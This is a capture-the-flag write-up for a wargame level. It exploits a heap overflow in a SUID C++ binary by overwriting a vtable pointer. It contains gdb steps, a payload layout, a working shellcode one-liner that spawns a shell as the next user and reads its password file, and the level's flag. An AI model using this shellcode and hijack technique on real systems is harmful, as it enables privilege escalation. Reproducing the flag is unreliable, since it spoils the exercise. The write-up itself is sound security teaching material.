# Level 9

SUID **bonus0**. C++ binary, NX off. Bug: `setAnnotation()` does `memcpy(annotation, s, strlen(s))` with no size check; `annotation` sits at offset 4 of object `a` (offset 0 is the hidden vtable pointer), and overflowing it reaches into the next heap object `b`. `*b + *a` is a virtual call (`call *(*(*b))`), so overwriting `b`'s vtable pointer picks what code runs.

1. Find `a` and `b`'s heap addresses (break right after each `operator new`):
   ```
   (gdb) b *0x0804861c        # after operator new(0x6c) for a
   (gdb) b *0x0804863e        # after operator new(0x6c) for b
   (gdb) run AAAA
   (gdb) p/x $eax             # a = 0x0804a008
   (gdb) c
   (gdb) p/x $eax             # b = 0x0804a078
   ```
   Gap between them: 112 bytes (fixed, even though the absolute addresses can shift).

2. `setAnnotation` writes starting at `a+4`. Distance from there to `b`'s vtable pointer (`b+0`): `112 - 4 = 108`.

3. Plan: put shellcode at `a+4`, a fake vtable entry (pointing back at the shellcode) at `a+104`, then overwrite `b`'s vtable pointer to point at that fake entry, so `call *(*(*b))` resolves to the shellcode.
   ```
   offset   0..44  : shellcode                      -> a+4   (0x0804a00c)
   offset  45..99  : 'A' padding
   offset 100..103 : 0x0804a00c (shellcode addr)     -> a+104 (0x0804a070, the fake vtable entry)
   offset 104..107 : 'A'*4 (b's chunk header, harmless)
   offset 108..111 : 0x0804a070 (fake vtable addr)   -> b+0   (b's real vtable pointer)
   ```

4. Run it:
   ```
   ./level9 "$(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "A"*55 + "\x0c\xa0\x04\x08" + "AAAA" + "\x70\xa0\x04\x08"')"
   id
   uid=2009(level9) [...] euid=2010(bonus0) [...]
   cat /home/user/bonus0/.pass
   ```
   (Shellcode is null-byte free, it travels through `argv[1]` as a C string.)

`Ressources/exploit.py` runs this over SSH against the real target.

Flag: `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`
